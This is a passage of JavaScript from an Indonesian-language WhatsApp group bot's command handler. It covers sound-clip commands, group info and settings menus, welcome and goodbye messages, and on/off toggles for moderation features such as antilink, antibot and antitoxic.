db.data.users[m.sender].exp += await randomNomor(20)
break
case 'sound1':
case 'sound2':
case 'sound3':
case 'sound4':
case 'sound5':
case 'sound6':
case 'sound7':
case 'sound8':
case 'sound9':
case 'sound10':
case 'sound11':
case 'sound12':
case 'sound13':
case 'sound14':
case 'sound15':
case 'sound16':
case 'sound17':
case 'sound18':
case 'sound19':
case 'sound20':
case 'sound21':
case 'sound22':
case 'sound23':
case 'sound24':
case 'sound25':
case 'sound26':
case 'sound27':
case 'sound28':
case 'sound29':
case 'sound30':
case 'sound31':
case 'sound32':
case 'sound33':
case 'sound34':
case 'sound35':
case 'sound36':
case 'sound37':
case 'sound38':
case 'sound39':
case 'sound40':
case 'sound41':
case 'sound42':
case 'sound43':
case 'sound44':
case 'sound45':
case 'sound46':
case 'sound47':
case 'sound48':
case 'sound49':
case 'sound50':
case 'sound51':
case 'sound52':
case 'sound53':
case 'sound54':
case 'sound55':
case 'sound56':
case 'sound57':
case 'sound58':
case 'sound59':
case 'sound60':
case 'sound61':
case 'sound62':
case 'sound63':
case 'sound64':
case 'sound65':
case 'sound66':
case 'sound67':
case 'sound68':
case 'sound69':
case 'sound70':
case 'sound71':
case 'sound72':
case 'sound73':
case 'sound74':
case 'sound75':
case 'sound76':
case 'sound77':
case 'sound78':
case 'sound79':
case 'sound80':
case 'sound81':
case 'sound82':
case 'sound83':
case 'sound84':
case 'sound85':
case 'sound86':
case 'sound87':
case 'sound88':
case 'sound89':
case 'sound90':
case 'sound91':
case 'sound92':
case 'sound93':
case 'sound94':
case 'sound95':
case 'sound96':
case 'sound97':
case 'sound98':
case 'sound99':
case 'sound100':
case 'sound101':
case 'sound102':
case 'sound103':
case 'sound104':
case 'sound105':
case 'sound106':
case 'sound107':
case 'sound108':
case 'sound109':
case 'sound110':
case 'sound111':
case 'sound112':
case 'sound113':
case 'sound114':
case 'sound115':
case 'sound116':
case 'sound117':
case 'sound118':
case 'sound119':
case 'sound120':
case 'sound121':
case 'sound122':
case 'sound123':
case 'sound124':
case 'sound125':
case 'sound126':
case 'sound127':
case 'sound128':
case 'sound129':
case 'sound130':
case 'sound131':
case 'sound132':
case 'sound133':
case 'sound134':
case 'sound135':
case 'sound136':
case 'sound137':
case 'sound138':
case 'sound139':
case 'sound140':
case 'sound141':
case 'sound142':
case 'sound143':
case 'sound144':
case 'sound145':
case 'sound146':
case 'sound147':
case 'sound148':
case 'sound149':
case 'sound150':
case 'sound151':
case 'sound152':
case 'sound153':
case 'sound154':
case 'sound155':
case 'sound156':
case 'sound157':
case 'sound158':
case 'sound159':
case 'sound160':
case 'sound161': {
let link = `https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`
await vreden.sendMessage(m.chat, {audio : {url : link }, mimetype:'audio/mpeg'}, {quoted:m})
}
db.data.users[m.sender].exp += await randomNomor(20)
break
// Group Menu
case 'afk':
if (!m.isGroup) return warning(mess.OnlyGrup)
if (m.key.fromMe) return warning('Bot Tidak Dapat Afk.')
if (isAfkOn) return warning('Afk sudah diaktifkan sebelumnya')
addCountCmd('afk', m.sender, _cmd)
let reason = text ? text : 'Nothing.'
afk.addAfkUser(m.sender, Date.now(), reason, _afk)
vreden.sendTextWithMentions(m.chat, `@${m.sender.split('@')[0]} sedang afk\nAlasan : ${reason}`, m)
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'infogc': case 'infogrup': {
if (!m.isGroup) return warning(mess.OnlyGrup)
let data = await vreden.groupMetadata(m.chat)
var infogc = `
*Keamanan* :
- *Anti Bot* : ${db.data.chats[m.chat].antibot ? 'Aktif 🟢' : 'Mati 🔴'}
- *Anti Link* : ${db.data.chats[m.chat].antilink ? 'Aktif 🟢' : 'Mati 🔴'}
- *Anti Link TT* : ${db.data.chats[m.chat].antilinktt ? 'Aktif 🟢' : 'Mati 🔴'}
- *Anti Toxic* : ${db.data.chats[m.chat].antitoxic ? 'Aktif 🟢' : 'Mati 🔴'}
- *Anti Virtex* : ${db.data.chats[m.chat].antivirtex ? 'Aktif 🟢' : 'Mati 🔴'}
- *Anti Wa Me* : ${db.data.chats[m.chat].antiwame ? 'Aktif 🟢' : 'Mati 🔴'}
- *Anti Wa Me 2* : ${db.data.chats[m.chat].antiwame2 ? 'Aktif 🟢' : 'Mati 🔴'}
- *Anti Link 2* : ${db.data.chats[m.chat].antilink2 ? 'Aktif 🟢' : 'Mati 🔴'}
- *Auto Download* : ${db.data.chats[m.chat].autodl ? 'Aktif 🟢' : 'Mati 🔴'}
- *Auto Ai GC* : ${db.data.chats[m.chat].autoaigc ? 'Aktif 🟢' : 'Mati 🔴'}
- *Kick Me* : ${db.data.chats[m.chat].kickme ? 'Aktif 🟢' : 'Mati 🔴'}
- *Keamanan* : ${db.data.chats[m.chat].keamanan ? 'Aktif 🟢' : 'Mati 🔴'}
- *Mute* : ${db.data.chats[m.chat].mute ? 'Aktif 🟢' : 'Mati 🔴'}
- *Welcome* : ${db.data.chats[m.chat].welcome ? 'Aktif 🟢' : 'Mati 🔴'}
- *Left* : ${db.data.chats[m.chat].goodbye ? 'Aktif 🟢' : 'Mati 🔴'}

*Group Info* :
- *Name* : ${data.subject}
- *ID* : ${data.id}
- *Dibuat* : ${moment(data.creation * 1000).tz('Asia/Kolkata').format('DD/MM/YYYY HH:mm:ss')}
- *Owner Grup* : ${data.owner !== undefined ? '@' + data.owner.split`@`[0] : 'Unknown'}
- *Jumlah Admin* : ${data.participants.filter(x => x.admin === 'admin').length} Ekor
- *Jumlah Peserta* : ${data.participants.filter(x => x.admin === null).length} Ekor

`
let button = [
              {
                "name": "single_select",
                "buttonParamsJson": "{\ntitle: 'Setting Group',\nsections: [\n{\ntitle: 'AntiLink Grup',\nrows: [\n{\nheader: 'On 🟢',\ntitle: 'antilink on',\ndescription: 'nyalakan antilink',\nid: '.antilink on'\n},\n{\nheader: 'Off 🔴',\ntitle: 'antilink off',\ndescription: 'matikan antilink',\nid: '.antilink off'\n}\n]\n},{\ntitle: 'AntiBot Grup',\nrows: [\n{\nheader: 'On 🟢',\ntitle: 'antibot on',\ndescription: 'nyalakan antibot',\nid: '.antibot on'\n},\n{\nheader: 'Off 🔴',\ntitle: 'antibot off',\ndescription: 'matikan antibot',\nid: '.antibot off'\n}\n]\n},{\ntitle: 'AntiLink2 Grup',\nrows: [\n{\nheader: 'On 🟢',\ntitle: 'antilink2 on',\ndescription: 'nyalakan antilink2',\nid: '.antilink2 on'\n},\n{\nheader: 'Off 🔴',\ntitle: 'antilink2 off',\ndescription: 'matikan antilink2',\nid: '.antilink2 off'\n}\n]\n},{\ntitle: 'AntiVirtext Grup',\nrows: [\n{\nheader: 'On 🟢',\ntitle: 'antivirtex on',\ndescription: 'nyalakan antivirtex',\nid: '.antivirtex on'\n},\n{\nheader: 'Off 🔴',\ntitle: 'antivirtex off',\ndescription: 'matikan antivirtex',\nid: '.antivirtex off'\n}\n]\n},{\ntitle: 'AntiLink TikTok Grup',\nrows: [\n{\nheader: 'On 🟢',\ntitle: 'antilinktt on',\ndescription: 'nyalakan antilinktt',\nid: '.antilinktt on'\n},\n{\nheader: 'Off 🔴',\ntitle: 'antilinktt off',\ndescription: 'matikan antilinktt',\nid: '.antilinktt off'\n}\n]\n},{\ntitle: 'AntiToxic Grup',\nrows: [\n{\nheader: 'On 🟢',\ntitle: 'antitoxic on',\ndescription: 'nyalakan antitoxic',\nid: '.antitoxic on'\n},\n{\nheader: 'Off 🔴',\ntitle: 'antitoxic off',\ndescription: 'matikan antitoxic',\nid: '.antitoxic off'\n}\n]\n},{\ntitle: 'AntiWaMe Grup',\nrows: [\n{\nheader: 'On 🟢',\ntitle: 'antiwame on',\ndescription: 'nyalakan antiwame',\nid: '.antiwame on'\n},\n{\nheader: 'Off 🔴',\ntitle: 'antiwame off',\ndescription: 'matikan antiwame',\nid: '.antiwame off'\n}\n]\n},{\ntitle: 'AntiWaMe2 Grup',\nrows: [\n{\nheader: 'On 🟢',\ntitle: 'antiwame2 on',\ndescription: 'nyalakan antiwame2',\nid: '.antiwame2 on'\n},\n{\nheader: 'Off 🔴',\ntitle: 'antiwame2 off',\ndescription: 'matikan antiwame2',\nid: '.antiwame2 off'\n}\n]\n},{\ntitle: 'Auto Download Grup',\nrows: [\n{\nheader: 'On 🟢',\ntitle: 'autodl on',\ndescription: 'nyalakan autodl',\nid: '.autodl on'\n},\n{\nheader: 'Off 🔴',\ntitle: 'autodl off',\ndescription: 'matikan autodl',\nid: '.autodl off'\n}\n]\n},{\ntitle: 'Auto Ai Grup',\nrows: [\n{\nheader: 'On 🟢',\ntitle: 'autoaigrup on',\ndescription: 'nyalakan autoaigrup',\nid: '.autoaigrup on'\n},\n{\nheader: 'Off 🔴',\ntitle: 'autoaigrup off',\ndescription: 'matikan autoaigrup',\nid: '.autoaigrup off'\n}\n]\n},{\ntitle: 'Auto Kick Me',\nrows: [\n{\nheader: 'On 🟢',\ntitle: 'kickme on',\ndescription: 'nyalakan kickme',\nid: '.kickme on'\n},\n{\nheader: 'Off 🔴',\ntitle: 'kickme off',\ndescription: 'matikan kickme',\nid: '.kickme off'\n}\n]\n},{\ntitle: 'Keamanan Grup',\nrows: [\n{\nheader: 'On 🟢',\ntitle: 'keamanan on',\ndescription: 'nyalakan keamanan',\nid: '.keamanan on'\n},\n{\nheader: 'Off 🔴',\ntitle: 'keamanan off',\ndescription: 'matikan keamanan',\nid: '.keamanan off'\n}\n]\n},{\ntitle: 'Mute Grup',\nrows: [\n{\nheader: 'On 🟢',\ntitle: 'mute on',\ndescription: 'nyalakan mute',\nid: '.mute on'\n},\n{\nheader: 'Off 🔴',\ntitle: 'mute off',\ndescription: 'matikan mute',\nid: '.mute off'\n}\n]\n},{\ntitle: 'Welcome Grup',\nrows: [\n{\nheader: 'On 🟢',\ntitle: 'welcome on',\ndescription: 'nyalakan welcome',\nid: '.welcome on'\n},\n{\nheader: 'Off 🔴',\ntitle: 'welcome off',\ndescription: 'matikan welcome',\nid: '.welcome off'\n}\n]\n},{\ntitle: 'GoodByee Grup',\nrows: [\n{\nheader: 'On 🟢',\ntitle: 'left on',\ndescription: 'nyalakan left',\nid: '.left on'\n},\n{\nheader: 'Off 🔴',\ntitle: 'left off',\ndescription: 'matikan left',\nid: '.left off'\n}\n]\n}\n]\n}"
              },{
                 "name": "cta_copy",
                 "buttonParamsJson": `{\"display_text\":\"Copy ID\",\"id\":\"123456789\",\"copy_code\":\"${data.id}\"}`
              }
             ]
await sendButtonDocThumbnail(m.chat, "----------- » *GRUP INFO* « -----------", infogc, "https://telegra.ph/file/56376c1e3c656e4e4fa12.jpg", button)
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'welcome':
if (!m.isGroup) return warning(mess.OnlyGrup)
if (!isAdmins && !isCreator) return tolakk(mess.GrupAdmin)
if (args[0] === "on") {
if (db.data.chats[m.chat].welcome) return m.reply(`Udah on`)
db.data.chats[m.chat].welcome = true
m.reply('Sukses mengaktifkan welcome di grup ini')
} else if (args[0] === "off") {
if (!db.data.chats[m.chat].welcome) return m.reply(`Udah off`)
db.data.chats[m.chat].welcome = false
m.reply('Sukses menonaktifkan welcome di grup ini')
} else {
let button = [
              {
                "name": "quick_reply",
                "buttonParamsJson": `{\"display_text\":\"on\",\"id\":\".${command} on\"}`
              },{
                "name": "quick_reply",
                "buttonParamsJson": `{\"display_text\":\"off\",\"id\":\".${command} off\"}`
              }
           ]
sendButtonBiasa(m.chat, `*Memasuki ${command} mode*`, `on -- _mengaktifkan_\noff -- _Menonaktifkan_`, button)
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'left': case 'goodbye':
if (!m.isGroup) return warning(mess.OnlyGrup)
if (!isAdmins && !isCreator) return tolakk(mess.GrupAdmin)
if (args[0] === "on") {
if (db.data.chats[m.chat].goodbye) return m.reply(`Udah on`)
db.data.chats[m.chat].goodbye = true
m.reply('Sukses mengaktifkan goodbye di grup ini')
} else if (args[0] === "off") {
if (!db.data.chats[m.chat].goodbye) return m.reply(`Udah off`)
db.data.chats[m.chat].goodbye = false
m.reply('Sukses menonaktifkan goodbye di grup ini')
} else {
let button = [
              {
                "name": "quick_reply",
                "buttonParamsJson": `{\"display_text\":\"on\",\"id\":\".${command} on\"}`
              },{
                "name": "quick_reply",
                "buttonParamsJson": `{\"display_text\":\"off\",\"id\":\".${command} off\"}`
              }
           ]
sendButtonBiasa(m.chat, `*Memasuki ${command} mode*`, `on -- _mengaktifkan_\noff -- _Menonaktifkan_`, button)
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'setwelcome':
if (!m.isGroup) return warning(mess.OnlyGrup)
if (!isCreator && !isAdmins) return tolakk(mess.GrupAdmin)
if (!text) return warning(`Gunakan dengan cara ${prefix+command} *teks_welcome*\n\n_Contoh_\n\n${prefix+command} Halo @user, Selamat datang di @group`)
if (isSetWelcome(m.chat, set_welcome_db)) return m.reply(`Set welcome already active`)
addSetWelcome(text, m.chat, set_welcome_db)
addCountCmd('setwelcome', m.sender, _cmd)
m.reply(`Successfully set welcome!`)
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'changewelcome':
if (!m.isGroup) return warning(mess.OnlyGrup)
if (!isCreator && !isAdmins) return tolakk(mess.GrupAdmin)
if (!text) return warning(`Gunakan dengan cara ${prefix+command} *teks_welcome*\n\n_Contoh_\n\n${prefix+command} Halo @user, Selamat datang di @group`)
if (isSetWelcome(m.chat, set_welcome_db)) {
addCountCmd('changewelcome', m.sender, _cmd)
changeSetWelcome(q, m.chat, set_welcome_db)
m.reply(`Sukses change set welcome teks!`)
} else {
addCountCmd('changewelcome', m.sender, _cmd)
addSetWelcome(q, m.chat, set_welcome_db)
m.reply(`Sukses change set welcome teks!`)
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'delsetwelcome':
if (!m.isGroup) return warning(mess.OnlyGrup)
if (!isCreator && !isAdmins) return tolakk(mess.GrupAdmin)
if (!isSetWelcome(m.chat, set_welcome_db)) return warning(`Belum ada set welcome di sini..`)
removeSetWelcome(m.chat, set_welcome_db)
addCountCmd('delsetwelcome', m.sender, _cmd)
m.reply(`Sukses delete set welcome`)
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'setleft':
if (!m.isGroup) return warning(mess.OnlyGrup)
if (!isCreator && !isAdmins) return tolakk(mess.GrupAdmin)
if (!text) return warning(`Gunakan dengan cara ${prefix + command} *teks_left*\n\n_Contoh_\n\n${prefix + command} Halo @user, Selamat tinggal dari @group`)
if (isSetLeft(m.chat, set_left_db)) return m.reply(`Set left already active`)
addCountCmd('setleft', m.sender, _cmd)
addSetLeft(q, m.chat, set_left_db)
m.reply(`Successfully set left!`)
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'changeleft':
if (!m.isGroup) return warning(mess.OnlyGrup)
if (!isCreator && !isAdmins) return tolakk(mess.GrupAdmin)
if (!text) return warning(`Gunakan dengan cara ${prefix + command} *teks_left*\n\n_Contoh_\n\n${prefix + command} Halo @user, Selamat tinggal dari @group`)
if (isSetLeft(m.chat, set_left_db)) {
addCountCmd('changeleft', m.sender, _cmd)
changeSetLeft(q, m.chat, set_left_db)
m.reply(`Sukses change set left teks!`)
} else {
addCountCmd('changeleft', m.sender, _cmd)
addSetLeft(q, m.chat, set_left_db)
m.reply(`Sukses change set left teks!`)
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'delsetleft':
if (!m.isGroup) return warning(mess.OnlyGrup)
if (!isCreator && !isAdmins) return tolakk(mess.GrupAdmin)
if (!isSetLeft(m.chat, set_left_db)) return warning(`Belum ada set left di sini..`)
addCountCmd('delsetleft', m.sender, _cmd)
removeSetLeft(m.chat, set_left_db)
m.reply(`Sukses delete set left`)
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'linkgrup': case 'linkgroup': case 'linkgc': {
if (!m.isGroup) return warning(mess.OnlyGrup)
if (!isBotAdmins) return tolakk(mess.BotAdmin)
let response = await vreden.groupInviteCode(m.chat)
vreden.sendText(m.chat, `https://chat.whatsapp.com/${response}\n\nLink Group : ${groupMetadata.subject}`, m, { detectLink: true })
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'pppanjang': case 'setppbot2':{
if (!isCreator) return tolakk(mess.OnlyOwner)
if (!quoted) return warning(`Reply foto dgn caption ${prefix + command}`)
if (!/image/.test(mime)) return warning(`Reply foto dgn caption ${prefix + command}`)
if (/webp/.test(mime)) return warning(`Reply foto dgn caption ${prefix + command}`)
let media = await vreden.downloadAndSaveMediaMessage(quoted)
var { img } = await generateProfilePicture(media)
await vreden.query({
tag: 'iq',
attrs: {
to: botNumber,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
} 
]
})
m.reply("Done!!!")
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'pppanjanggc': case 'ppgcfull': case 'setppgc2':{
if (!m.isGroup) return warning(mess.OnlyGrup)
if (!isAdmins && !isCreator) return tolakk(mess.GrupAdmin)
if (!isBotAdmins) return tolakk(mess.BotAdmin)
if (!quoted) return warning(`Reply foto dgn caption ${prefix + command}`)
if (!/image/.test(mime)) return warning(`Reply foto dgn caption ${prefix + command}`)
if (/webp/.test(mime)) return warning(`Reply foto dgn caption ${prefix + command}`)
let media = await vreden.downloadAndSaveMediaMessage(quoted)
var { img } = await generateProfilePicture(media)
await vreden.query({
tag: 'iq',
attrs: {
to: m.chat,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
} 
]
})
m.reply("Done!!!")
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'setppgroup': case 'setppgrup': case 'setppgc': {
if (!m.isGroup) return warning(mess.OnlyGrup)
if (!isAdmins && !isCreator) return tolakk(mess.GrupAdmin)
if (!isBotAdmins) return tolakk(mess.BotAdmin)
if (!quoted) return warning (`Kirim/Reply Image Dengan Caption ${prefix + command}`)
if (!/image/.test(mime)) return warning (`Kirim/Reply Image Dengan Caption ${prefix + command}`)
if (/webp/.test(mime)) return warning (`Kirim/Reply Image Dengan Caption ${prefix + command}`)
let media = await vreden.downloadAndSaveMediaMessage(quoted)
await vreden.updateProfilePicture(m.chat, { url: media }).catch((err) => fs.unlinkSync(media))
m.reply("Berhasil mengganti pp group")
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'setname': case 'setsubject': {
if (!m.isGroup) return warning(mess.OnlyGrup)
if (!isAdmins && !isCreator) return tolakk(mess.GrupAdmin)
if (!isBotAdmins) return tolakk(mess.BotAdmin)
if (!text) return warning(`*Masukan Input Query!*\n\nContoh ${prefix + command} WhatsApp Bot`)
await vreden.groupUpdateSubject(m.chat, text).then((res) => m.reply("Done")).catch((err) => m.reply(jsonformat(err)))
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'setdesc': case 'setdesk': {
if (!m.isGroup) return warning(mess.OnlyGrup)
if (!isAdmins && !isCreator) return tolakk(mess.GrupAdmin)
if (!isBotAdmins) return tolakk(mess.BotAdmin)
if (!text) return warning(`*Masukan Input Query!*\n\nContoh ${prefix + command} WhatsApp Bot`)
await vreden.groupUpdateDescription(m.chat, text).then((res) => m.reply("Done")).catch((err) => m.reply(jsonformat(err)))
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'autoaigrup':case 'aigrup': case 'autoaigc':{
if (!m.isGroup) return warning(mess.OnlyGrup)
if (!isAdmins && !isCreator) return tolakk(mess.GrupAdmin)
if (args[0] === "on") {
if (db.data.chats[m.chat].autoaigc) return m.reply(`Udah aktif`)
db.data.chats[m.chat].autoaigc = true
m.reply('Successfully Activate Auto AI')
} else if (args[0] === "off") {
if (!db.data.chats[m.chat].autoaigc) return m.reply(`Udah nonaktif`)
db.data.chats[m.chat].autoaigc = false
m.reply('Successfully Disabling Auto AI')
} else {
let button = [
              {
                "name": "quick_reply",
                "buttonParamsJson": `{\"display_text\":\"on\",\"id\":\".${command} on\"}`
              },{
                "name": "quick_reply",
                "buttonParamsJson": `{\"display_text\":\"off\",\"id\":\".${command} off\"}`
              }
           ]
sendButtonBiasa(m.chat, `*Memasuki ${command} mode*`, `on -- _mengaktifkan_\noff -- _Menonaktifkan_`, button)
}}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'autoaijapri':case 'aipc': case 'autoaipc':{
if (m.isGroup) return warning('Fitur Khusus Japri!')
if (!isCreator) return tolakk(mess.OnlyOwner)
if (args[0] === "on") {
addCountCmd('autoaijapri', m.sender, _cmd)
if (isAutoAiPc) return m.reply(`Udah aktif`)
openaipc.push(botNumber)
fs.writeFileSync('./database/openaipc.json', JSON.stringify(openaipc, null, 2))
m.reply('Successfully Activate Auto AI')
} else if (args[0] === "off") {
addCountCmd('autoaijapri', m.sender, _cmd)
if (!isAutoAiPc) return m.reply(`Udah nonaktif`)
let anu = openaipc.indexOf(botNumber)
openaipc.splice(anu, 1)
fs.writeFileSync('./database/openaipc.json', JSON.stringify(openaipc, null, 2))
m.reply('Successfully Disabling Auto AI')
} else {
let button = [
              {
                "name": "quick_reply",
                "buttonParamsJson": `{\"display_text\":\"on\",\"id\":\".${command} on\"}`
              },{
                "name": "quick_reply",
                "buttonParamsJson": `{\"display_text\":\"off\",\"id\":\".${command} off\"}`
              }
           ]
sendButtonBiasa(m.chat, `*Memasuki ${command} mode*`, `on -- _mengaktifkan_\noff -- _Menonaktifkan_`, button)
}}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'antibot':{
if (!m.isGroup) return warning(mess.OnlyGrup)
if (!isAdmins && !isCreator) return tolakk(mess.GrupAdmin)
if (!isBotAdmins) return tolakk(mess.BotAdmin)
if (args[0] === "on") {
if (db.data.chats[m.chat].antibot) return m.reply(`Udah aktif`)
db.data.chats[m.chat].antibot = true
m.reply('Successfully Activate Antibot In This Group')
} else if (args[0] === "off") {
if (!db.data.chats[m.chat].antibot) return m.reply(`Udah nonaktif`)
db.data.chats[m.chat].antibot = false
m.reply('Successfully Disabling Antibot In This Group')
} else {
let button = [
              {
                "name": "quick_reply",
                "buttonParamsJson": `{\"display_text\":\"on\",\"id\":\".${command} on\"}`
              },{
                "name": "quick_reply",
                "buttonParamsJson": `{\"display_text\":\"off\",\"id\":\".${command} off\"}`
              }
           ]
sendButtonBiasa(m.chat, `*Memasuki ${command} mode*`, `on -- _mengaktifkan_\noff -- _Menonaktifkan_`, button)
}}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'antilink':{
if (!m.isGroup) return warning(mess.OnlyGrup)
if (!isAdmins && !isCreator) return tolakk(mess.GrupAdmin)
if (!isBotAdmins) return tolakk(mess.BotAdmin)
if (args[0] === "on") {
if (db.data.chats[m.chat].antilink) return m.reply(`Udah aktif`)
db.data.chats[m.chat].antilink = true
db.data.chats[m.chat].antilink2 = false
m.reply('Successfully Activate Antilink In This Group')
} else if (args[0] === "off") {
if (!db.data.chats[m.chat].antilink) return m.reply(`Udah nonaktif`)
db.data.chats[m.chat].antilink = false
m.reply('Successfully Disabling Antilink In This Group')
} else {
let button = [
              {
                "name": "quick_reply",
                "buttonParamsJson": `{\"display_text\":\"on\",\"id\":\".${command} on\"}`
              },{
                "name": "quick_reply",
                "buttonParamsJson": `{\"display_text\":\"off\",\"id\":\".${command} off\"}`
              }
           ]
sendButtonBiasa(m.chat, `*Memasuki ${command} mode*`, `on -- _mengaktifkan_\noff -- _Menonaktifkan_`, button)
}}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'antilink2':{
if (!m.isGroup) return warning(mess.OnlyGrup)
if (!isAdmins && !isCreator) return tolakk(mess.GrupAdmin)
if (!isBotAdmins) return tolakk(mess.BotAdmin)
 if (args[0] === "on") {
if (db.data.chats[m.chat].antilink2) return m.reply(`Udah aktif`)
db.data.chats[m.chat].antilink2 = true
db.data.chats[m.chat].antilink = false
m.reply('Successfully Activate Antilink2 In This Group')
} else if (args[0] === "off") {
if (!db.data.chats[m.chat].antilink2) return m.reply(`Udah nonaktif`)
db.data.chats[m.chat].antilink2 = false
m.reply('Successfully Disabling Antilink2 In This Group')
} else {
let button = [
              {
                "name": "quick_reply",
                "buttonParamsJson": `{\"display_text\":\"on\",\"id\":\".${command} on\"}`
              },{
                "name": "quick_reply",
                "buttonParamsJson": `{\"display_text\":\"off\",\"id\":\".${command} off\"}`
              }
           ]
sendButtonBiasa(m.chat, `*Memasuki ${command} mode*`, `on -- _mengaktifkan_\noff -- _Menonaktifkan_`, button)
}}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'antivirtex':{
if (!m.isGroup) return warning(mess.OnlyGrup)
if (!isAdmins && !isCreator) return tolakk(mess.GrupAdmin)
if (!isBotAdmins) return tolakk(mess.BotAdmin)
if (args[0] === "on") {
if (db.data.chats[m.chat].antivirtex) return m.reply(`Udah aktif`)
db.data.chats[m.chat].antivirtex = true
m.reply('Successfully Activate Antivirtex In This Group')
} else if (args[0] === "off") {
if (!db.data.chats[m.chat].antivirtex) return m.reply(`Udah nonaktif`)
db.data.chats[m.chat].antivirtex = false
m.reply('Successfully Disabling Antivirtex In This Group')
} else {
let button = [
              {
                "name": "quick_reply",
                "buttonParamsJson": `{\"display_text\":\"on\",\"id\":\".${command} on\"}`
              },{
                "name": "quick_reply",
                "buttonParamsJson": `{\"display_text\":\"off\",\"id\":\".${command} off\"}`
              }
           ]
sendButtonBiasa(m.chat, `*Memasuki ${command} mode*`, `on -- _mengaktifkan_\noff -- _Menonaktifkan_`, button)
}}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'autodl':{
if (args[0] === "on") {
if (db.data.chats[m.chat].autodl) return m.reply(`Udah aktif`)
db.data.chats[m.chat].autodl = true
m.reply('Successfully Activate Autodl In This Chat')
} else if (args[0] === "off") {
if (!db.data.chats[m.chat].autodl) return m.reply(`Udah nonaktif`)
db.data.chats[m.chat].autodl = false
m.reply('Successfully Disabling Autodl In This Chat')
} else {
let button = [
              {
                "name": "quick_reply",
                "buttonParamsJson": `{\"display_text\":\"on\",\"id\":\".${command} on\"}`
              },{
                "name": "quick_reply",
                "buttonParamsJson": `{\"display_text\":\"off\",\"id\":\".${command} off\"}`
              }
           ]
sendButtonBiasa(m.chat, `*Memasuki ${command} mode*`, `on -- _mengaktifkan_\noff -- _Menonaktifkan_`, button)
}}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'keamanan':{
if (!m.isGroup) return warning(mess.OnlyGrup)
if (!isAdmins && !isCreator) return tolakk(mess.GrupAdmin)
if (!isBotAdmins) return tolakk(mess.BotAdmin)
if (args[0] === "on") {
if (db.data.chats[m.chat].keamanan) return m.reply(`Udah aktif`)
db.data.chats[m.chat].keamanan = true
if (!db.data.chats[m.chat].antivirtex) {
db.data.chats[m.chat].antivirtex = true
}
if (!db.data.chats[m.chat].mute) {
db.data.chats[m.chat].mute = true
}
if (!db.data.chats[m.chat].antilink2) {
db.data.chats[m.chat].antilink2 = true
}
m.reply('Successfully Activate Keamanan In This Chat')
} else if (args[0] === "off") {
if (!db.data.chats[m.chat].keamanan) return m.reply(`Udah nonaktif`)
db.data.chats[m.chat].keamanan = false
if (db.data.chats[m.chat].antilink2) {
db.data.chats[m.chat].antilink2 = false 
}
if (db.data.chats[m.chat].mute) {
db.data.chats[m.chat].mute = false
}
if (db.data.chats[m.chat].antivirtex) {
db.data.chats[m.chat].antivirtex = false
}
m.reply('Successfully Disabling Keamanan In This Chat')
} else {
let button = [
              {
                "name": "quick_reply",
                "buttonParamsJson": `{\"display_text\":\"on\",\"id\":\".${command} on\"}`
              },{
                "name": "quick_reply",
                "buttonParamsJson": `{\"display_text\":\"off\",\"id\":\".${command} off\"}`
              }
           ]
sendButtonBiasa(m.chat, `*Memasuki ${command} mode*`, `on -- _mengaktifkan_\noff -- _Menonaktifkan_`, button)
}}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'antilinktt':{
if (!m.isGroup) return warning(mess.OnlyGrup)
if (!isAdmins && !isCreator) return tolakk(mess.GrupAdmin)
if (!isBotAdmins) return tolakk(mess.BotAdmin)
if (args[0] === "on") {
if (db.data.chats[m.chat].antilinktt) return m.reply(`Udah aktif`)
db.data.chats[m.chat].antilinktt = true
m.reply('Successfully Activate antilinktt In This Group')
} else if (args[0] === "off") {
if (!db.data.chats[m.chat].antilinktt) return m.reply(`Udah nonaktif`)
db.data.chats[m.chat].antilinktt = false
m.reply('Successfully Disabling antilinktt In This Group')
} else {
let button = [
              {
                "name": "quick_reply",
                "buttonParamsJson": `{\"display_text\":\"on\",\"id\":\".${command} on\"}`
              },{
                "name": "quick_reply",
                "buttonParamsJson": `{\"display_text\":\"off\",\"id\":\".${command} off\"}`
              }
           ]
sendButtonBiasa(m.chat, `*Memasuki ${command} mode*`, `on -- _mengaktifkan_\noff -- _Menonaktifkan_`, button)
}}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'antitoxic':{
if (!m.isGroup) return warning(mess.OnlyGrup)
if (!isAdmins && !isCreator) return tolakk(mess.GrupAdmin)
if (!isBotAdmins) return tolakk(mess.BotAdmin)
if (args[0] === "on") {
if (db.data.chats[m.chat].antitoxic) return m.reply(`Udah aktif`)
db.data.chats[m.chat].antitoxic = true
m.reply('Successfully Activate Antitoxic In This Group')
} else if (args[0] === "off") {
if (!db.data.chats[m.chat].antitoxic) return m.reply(`Udah nonaktif`)
db.data.chats[m.chat].antitoxic = false
m.reply('Successfully Disabling Antitoxic In This Group')
} else {
let button = [
              {
                "name": "quick_reply",
                "buttonParamsJson": `{\"display_text\":\"on\",\"id\":\".${command} on\"}`
              },{
                "name": "quick_reply",
                "buttonParamsJson": `{\"display_text\":\"off\",\"id\":\".${command} off\"}`
              }
           ]
